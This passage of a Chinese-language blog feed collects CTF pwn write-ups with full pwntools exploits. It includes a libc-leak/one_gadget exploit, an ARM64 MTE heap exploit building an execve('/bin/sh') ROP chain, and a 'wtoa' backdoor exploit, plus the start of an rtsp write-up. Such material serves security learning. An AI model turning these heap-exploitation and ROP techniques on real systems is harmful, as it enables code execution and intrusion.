p.sendlineafter(<span class="hljs-string">b&#x27;Sign the name of the new owner here:\n&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drop_rod</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuse</span>(<span class="hljs-params">name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Sign the name of the one who wants to fuse this new weapon here:\n&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drop</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exitt</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;7&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">default</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;8&#x27;</span>)<br><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>take_rod(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x781</span>)<br>take_ruby(p64(elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]))<br>fuse(<span class="hljs-string">b&#x27;c&#x27;</span>)<br>drop()<br>drop_rod()<br>libcbase=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-libc.symbols[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>one_addr=libcbase+<span class="hljs-number">0xe6aee</span><br>take_rod(p64(one_addr)+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x781</span>-<span class="hljs-number">8</span>))<br>take_ruby(p64(<span class="hljs-number">0x44ba80</span>))<br>fuse(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>drop()<br>drop_rod()<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="mte-notebook"><a href="#mte-notebook" class="headerlink" title="mte notebook"></a>mte notebook</h1><p>è°ƒè¯•èµ·æ¥å¥½æ…¢&#x2F;(ã„’oã„’)&#x2F;~~</p><h2 id="arm64-mte"><a href="#arm64-mte" class="headerlink" title="arm64 mte"></a>arm64 mte</h2><p><em>ä¸€äº›ä¸ªäººç†è§£</em></p><p>flag1å¯ä»¥å¸®åŠ©ç†è§£ä¸€ä¸‹mte</p><ul><li><p>å°†æŒ‡é’ˆçš„æœ€é«˜å­—èŠ‚ä½œä¸ºtagä½¿ç”¨ï¼Œå¦‚æœæŒ‡é’ˆçš„tagå’Œä¹‹å‰æ‰“çš„tagä¸ç¬¦åˆ™æŠ¥é”™</p><img src="/2024/01/28/2023TPCTFpwnwp/tag.png" class title="tag"><p>æ¯”å¦‚mallocä¸€å—å†…å­˜ï¼Œè¿”å›çš„æŒ‡é’ˆæœ€é«˜å­—èŠ‚å°±æ˜¯æ‰“ä¸Šçš„tagï¼Œä½¿ç”¨æŒ‡é’ˆçš„æ—¶å€™åº”è¯¥ä½¿ç”¨ <strong>0x600ffff9bc768b0</strong> è€Œä¸æ˜¯ <strong>0xffff9bc768b0</strong></p></li><li><p>æ‰“tagé€šè¿‡è½¯ä»¶è¿›è¡Œï¼Œtagçš„éªŒè¯é€šè¿‡ç¡¬ä»¶è¿›è¡Œ</p><ul><li><p>tagçš„éªŒè¯çŒœæµ‹é€šè¿‡åœ¨å†…å­˜è®¿é—®ï¼ˆldr &#x2F; strï¼‰æ—¶ï¼ŒåŒæ­¥æ£€æµ‹tagæ˜¯å¦åŒ¹é…</p></li><li><p>å¯ä»¥é€šè¿‡ <strong>STG</strong> æŒ‡ä»¤æ‰“tagï¼ˆtagçš„ç²’åº¦ä¸º16å­—èŠ‚ï¼‰ï¼Œflag1ä¸­æœ‰è¿™ä¸ªè¿‡ç¨‹</p><p>flag1çš„å‰16å­—èŠ‚çš„tagæ˜¯flag1çš„ç¬¬ä¸€ä¸ªå­—èŠ‚</p><img src="/2024/01/28/2023TPCTFpwnwp/flag1.png" class title="flag1"><p>æ¥ä¸‹æ¥çš„tagåˆ†åˆ«æ˜¯flag1çš„ç¬¬4ï¼Œ8ï¼Œ12å­—èŠ‚çš„ä½4bit</p><p>å¯ä»¥é€šè¿‡ä»¥ä¸Štagçš„æŒ‡é’ˆè·å–flag1</p><img src="/2024/01/28/2023TPCTFpwnwp/flag111.png" class title="flag111"></li></ul></li><li><p>æœç´¢STGæŒ‡ä»¤å¯ä»¥çœ‹åˆ°ä¸€ä¸ªä¸“é—¨ç”¨äºæ‰“tagçš„å‡½æ•°</p><img src="/2024/01/28/2023TPCTFpwnwp/tagregion.png" class title="tagregion"><p>åœ¨mallocå’Œfreeä¸­éƒ½è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°</p><img src="/2024/01/28/2023TPCTFpwnwp/malloc.png" class title="malloc"><img src="/2024/01/28/2023TPCTFpwnwp/free.png" class title="free"><ul><li>mallocä¼šç»™è¿”å›çš„æŒ‡é’ˆæ‰“ä¸Štag</li><li>freeåä¼šé‡æ–°æ‰“tagï¼Œæ‰€ä»¥ä½¿ç”¨freeåçš„å†…å­˜ä¼šæŠ¥é”™</li></ul><img src="/2024/01/28/2023TPCTFpwnwp/tagtag.jpg" class title="tagtag"></li></ul><h2 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ç”±äºè°ƒè¯•å¤ªæ…¢å¤±å»è€å¿ƒæ‰€ä»¥æ²¡è‡ªå·±æ“expï¼Œç›´æ¥è°ƒè¯•ä¸€é<a href="https://blog.xmcve.com/2023/11/28/TPCTF2023-Writeup/#title-5">æ˜Ÿç›Ÿçš„exp</a></p><p>åˆ©ç”¨çš„æ ¹æ®</p><ul><li>mallocçš„å†…å­˜éƒ½æ‰“äº†tagï¼Œåˆ©ç”¨overlapä¼šä½¿ç”¨æœªæ‰“tagçš„å†…å­˜ï¼ŒæŠ¥é”™</li><li>freeåä¼šé‡æ–°æ‰“tagï¼Œuafä¹‹åä½¿ç”¨çš„æŒ‡é’ˆçš„tagæ˜¯mallocçš„tagï¼ŒæŠ¥é”™</li><li>å †ä»¥å¤–çš„åœ°å€ï¼ˆæ¯”å¦‚main_arenaï¼‰æ²¡æ‰“tagå¯ä»¥ä½¿ç”¨ï¼Œä¹‹å‰æ³„éœ²äº†æ ˆåœ°å€ï¼Œå¯ä»¥åˆ°æ ˆä¸Šå†™ropé“¾</li></ul><p>ä¸¤ä¸ªç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">note</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">char</span> title[<span class="hljs-number">16</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> * <span class="hljs-title">page</span>;</span><br>    <span class="hljs-type">char</span> description[<span class="hljs-number">96</span>];<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span>* <span class="hljs-title">next</span>;</span><br>    <span class="hljs-type">char</span>content[<span class="hljs-number">96</span>];<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>10ä¸ªnote</p><img src="/2024/01/28/2023TPCTFpwnwp/note.png" class title="note"></li><li><p>å…ˆdropæ‰0~7çš„noteï¼Œå¡«æ»¡tcacheï¼ŒæŠŠnote[7]æ”¾è¿›unsorted bin</p><img src="/2024/01/28/2023TPCTFpwnwp/bin.png" class title="bin"></li><li><p>æŠŠnote[7]ç”³è¯·å›æ¥ä½œä¸ºpageï¼Œnoteæ˜¯0x90ï¼Œpageæ˜¯0x80ï¼Œä½†å¦‚æœä»0x90ä¸­åˆ†å‰²0x80é‚£ä¹ˆå‰©ä¸‹0x10ä¸è¶³0x10ï¼Œæ‰€ä»¥ä¼šç›´æ¥è¿”å›0x90çš„note</p><img src="/2024/01/28/2023TPCTFpwnwp/page.png" class title="page"><p>ç”±äºæœªåˆå§‹åŒ–æ¼æ´unsorted chunkçš„bkå°±æ˜¯struct pageçš„nextï¼Œä¼ªé€ éœ€è¦å†™0x18å­—èŠ‚ï¼Œæ‰€ä»¥å‰ç§»3é¡µ</p><p>ä¼ªé€ å®Œçš„page</p><img src="/2024/01/28/2023TPCTFpwnwp/page1.png" class title="page1"></li><li><p>ä¸€æ ·çš„æ­¥éª¤ï¼Œè¿™æ¬¡æŠŠnote[8]é‡Šæ”¾æ‰ï¼Œå†™ropé“¾ï¼Œoverwrite_pageç»“æŸåå¼€å§‹ropé“¾</p><img src="/2024/01/28/2023TPCTFpwnwp/rop.png" class title="rop"><p>ropé“¾å°±æ˜¯åˆ©ç”¨ <strong>svc #0</strong> è¿›è¡Œç³»ç»Ÿè°ƒç”¨</p><img src="/2024/01/28/2023TPCTFpwnwp/syscall.png" class title="syscall"></li></ul><h2 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;arm64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choosenote</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readpage</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">editpage</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> data:<br>        p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">hex</span>(item)[<span class="hljs-number">2</span>:].encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">nextpage</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">addpage</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dropnote</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;6&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exitt</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;7&#x27;</span>)<br><br>p=process(<span class="hljs-string">&#x27;./run.sh&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;I\&#x27;ve put flag1 in 0x&#x27;</span>)<br>flag1=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;,&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(flag1))<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    choosenote(i)<br>    dropnote()<br><br>choosenote(<span class="hljs-number">9</span>)<br>addpage()<br>nextpage()<br>nextpage()<br>nextpage()<br><br>editpage([<span class="hljs-number">0x61</span>, flag1-<span class="hljs-number">0x90</span>, <span class="hljs-number">0</span>])<br>choosenote(<span class="hljs-number">8</span>)<br>dropnote()<br>choosenote(<span class="hljs-number">9</span>)<br>addpage()<br>nextpage()<br>nextpage()<br>nextpage()<br><br>editpage([<span class="hljs-number">0x61</span>, <span class="hljs-number">0x4521b8</span>, <span class="hljs-number">1</span>, flag1-<span class="hljs-number">0x80</span>+<span class="hljs-number">0x10</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0x42629c</span>, flag1+<span class="hljs-number">0x1d0</span>, <span class="hljs-number">6</span>, flag1] + [i + <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xb</span>)] + [<span class="hljs-number">0x400260</span>] + [i + <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xa</span>)] + [<span class="hljs-number">0x45d028</span>, <span class="hljs-number">221</span>] + [i + <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x1c</span>)] + [<span class="hljs-number">0x41a628</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0x4521b8</span>, <span class="hljs-number">0x413c64</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x413c64</span>, flag1+<span class="hljs-number">0x1c8</span>] + [<span class="hljs-number">0x68732f6e69622f</span>, flag1+<span class="hljs-number">0x1c8</span>, <span class="hljs-number">0</span>])<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023 å¼ºç½‘æ¯çº¿ä¸Šèµ› pwn wp</title>
    <link href="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/"/>
    <url>/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/</url>
    
    <content type="html"><![CDATA[<p>æœ€è‡ªé—­çš„ä¸€åœº</p><p>åªå†™äº†æ¯”èµ›çš„æ—¶å€™æ²¡åšå‡ºæ¥çš„ï¼Œè§£æ•°æ¯”è¾ƒå¤šçš„ä¸¤é“</p><span id="more"></span><h1 id="wtoa"><a href="#wtoa" class="headerlink" title="wtoa"></a>wtoa</h1><p>wasmtime Ahead-Of-Timeï¼ˆAOTï¼‰é¢„ç¼–è¯‘WASMæºç ç”Ÿæˆçš„JITä»£ç </p><p>é‡Œé¢æœ¬è´¨è¿˜æ˜¯å¯æ‰§è¡Œçš„æœºå™¨ç ï¼Œç»è°ƒè¯•å‘ç°å¤§æ¦‚æ˜¯wasmtimeä¼šè°ƒç”¨wtoaé‡Œçš„ä»£ç ï¼Œwtoaåˆä¼šè°ƒç”¨wasmtimeçš„ä¸€äº›æ¥å£ç”¨äºè¾“å…¥è¾“å‡ºä¹‹ç±»çš„</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/vmmapwtoa.png" class title="vmmapwtoa"><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/bt1.png" class title="bt1"><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/bt2.png" class title="bt2"><h2 id="é€†å‘-amp-è°ƒè¯•"><a href="#é€†å‘-amp-è°ƒè¯•" class="headerlink" title="é€†å‘ &amp; è°ƒè¯•"></a>é€†å‘ &amp; è°ƒè¯•</h2><p>å­¦åˆ°ä¸€ä¸ªæ–°æ“ä½œï¼ŒIDA View-&gt;Graphs-&gt;Function Callsèƒ½çœ‹å‡½æ•°è°ƒç”¨å›¾ï¼Œç”±äºè¿™ä¸ªé¢˜çœ‹ç€åƒä¸ªèœå•</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/wtoa.png" class title="wtoa"><p>è¿™ä¸ªå‡½æ•°çœ‹ç€åƒèœå•çš„èµ·ç‚¹ï¼ˆä¹Ÿç¡®å®æ˜¯ï¼‰ï¼Œåº·åº·</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/graph.png" class title="graph"><p><em>psï¼šå…¶å®æ¯”èµ›çš„æ—¶å€™å¤çˆ¹å·²ç»é€†åˆ°è¿™äº†ï¼Œtqlï¼</em></p><p>å…ˆçœ‹çœ‹ç¨‹åºçš„åŠŸèƒ½</p><ul><li><p>Add</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/add.png" class title="add"></li><li><p>Edit</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/edit.png" class title="edit"></li><li><p>Delete</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/delete.png" class title="delete"></li><li><p>Show</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/show.png" class title="show"></li></ul><p>æµ…æµ…è°ƒè¯•ä¸€ä¸‹ï¼Œ<strong>IDAå†…çš„åœ°å€æ˜¯gdbçš„ç›¸å¯¹åœ°å€+0x1000</strong></p><p>è¿™ä¸ªåº”è¯¥æ˜¯è¾“å…¥çš„åœ°æ–¹</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/input.png" class title="input"><ul><li>v5ï¼šrbx</li><li>v4ï¼šr15</li></ul><p>åº”è¯¥æ˜¯åªå–è¾“å…¥çš„ä¸¤å­—èŠ‚ï¼Œè¿›è¡Œæ“ä½œçš„åˆ¤æ–­ï¼Œç„¶åå°±æ˜¯å„ä¸ªåŠŸèƒ½å¯¹åº”çš„å‡½æ•°</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/aaa.png" class title="aaa"><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/aa.png" class title="aa"><p>å¯ä»¥çœ‹å‡ºæˆ‘ä»¬æƒ³è¦çš„flagå°±åœ¨ä¸‹é¢</p><p>åç¼–è¯‘å¯ä»¥çœ‹å‡ºå¯»å€éƒ½æ˜¯æŒ‰åŸºå€+æ®µå†…åç§»è¿›è¡Œçš„ï¼Œå †å—çš„ç®¡ç†å¤§æ¦‚æ˜¯è¿™æ ·çš„â†“</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/chunk.png" class title="chunk"><p>editä¸­æœ‰ä¸ªåé—¨ï¼Œlengthä¸º3428913çš„æ—¶å€™å¯ä»¥å°†å½“å‰å †å—çš„å†…å®¹æ‰©å†™ä¸º48å­—èŠ‚</p><p>å½“addä¸¤ä¸ªnoteçš„æ—¶å€™note1çš„chunkå°±åœ¨note0çš„dataä¸Šé¢ï¼Œç›´æ¥å°†note1-&gt;bufferæŒ‡å‘flagï¼Œsizeæ”¹å¤§å†show note1å°±è¡Œ</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/tele.png" class title="tele"><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;A&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27; &gt; &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx,offset,length</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;S&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;offset&#x27;</span>,<span class="hljs-built_in">str</span>(offset).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;length&#x27;</span>,<span class="hljs-built_in">str</span>(length).encode())<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,offset,data,length</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;offset&#x27;</span>,<span class="hljs-built_in">str</span>(offset).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;length&#x27;</span>,<span class="hljs-built_in">str</span>(length).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27; &gt; &#x27;</span>,data)<br><br>p=process(<span class="hljs-string">&#x27;./launch.sh&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(<span class="hljs-number">0x1300000000</span>)+p64(<span class="hljs-number">0x00501cd800501ca0</span>)+p64(<span class="hljs-number">0x1b00000000</span>)+p64(<span class="hljs-number">0x501b40</span>)+p64(<span class="hljs-number">0x100</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,payload,<span class="hljs-number">3428913</span>)<br>show(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x50</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="rtsp"><a href="#rtsp" class="headerlink" title="rtsp"></a>rtsp</h1><p>éå¸¸å¥½ä¸­æ–‡è·¯å¾„~~~&#x2F;&#x2F;&#x2F;(^v^)\\\~~~</p><h2 id="åŸºæœ¬æƒ…å†µ"><a href="#åŸºæœ¬æƒ…å†µ" class="headerlink" title="åŸºæœ¬æƒ…å†µ"></a>åŸºæœ¬æƒ…å†µ</h2><ul><li><p>æ²¡å¼€canary</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/checksec.png" class title="checksec"></li><li><p>å­—ç¬¦ä¸²å¤§æ³•å¥½ï¼Œlive555å¼€æºåº“ï¼Œæºç get âˆš</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">.rodata:0000000000081CE300000018CLIVE555 Streaming Media<br></code></pre></td></tr></table></figure></li><li><p>rtspåè®®ç±»ä¼¼httpï¼Œæœ‰å„ç§æ–¹æ³•å¦‚SETUPï¼ŒGET_PARAMERTERï¼ŒPAUSEç­‰ï¼Œä¸€ä¸ªæŠ¥æ–‡ç±»ä¼¼è¿™æ ·ğŸ‘‡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">GET_PARAMETER rtsp://192.168.111.143:8554/* RTSP/1.0<br>Session: 3E1B7756<br>CSeq: 1<br>GET_INFO: 2023<br></code></pre></td></tr></table></figure></li></ul><h2 id="å„ç§åé—¨"><a href="#å„ç§åé—¨" class="headerlink" title="å„ç§åé—¨"></a>å„ç§åé—¨</h2><ul><li><p>æœ‰æºç æ‰€ä»¥å¯ä»¥ç¼–ä¸€ä¸ªbindiffï¼ŒçŒœæµ‹ä¼šåœ¨å„ä¸ªæ–¹æ³•çš„å¤„ç†å‡½æ•°é‡Œè¿›è¡Œæ”¹åŠ¨ï¼Œæ‰€ä»¥æ»¤ä¸€æ³¢handleCmdï¼ˆè¿™ä¸ªæ€è·¯æŒºç‰›é€¼çš„ï¼‰</p><img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/handlecmd.png" class title="handlecmd"></li><li><p>æˆ–è€…å­—ç¬¦ä¸²ä¸­ä¹Ÿèƒ½çœ‹åˆ°ä¸€äº›å¥‡æ€ªçš„å­—ç¬¦ä¸²</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">.rodata:000000000007B39B0000001CC100 maybe you need this %p\n<br>.rodata:000000000007B3C800000022C100 you may want to get 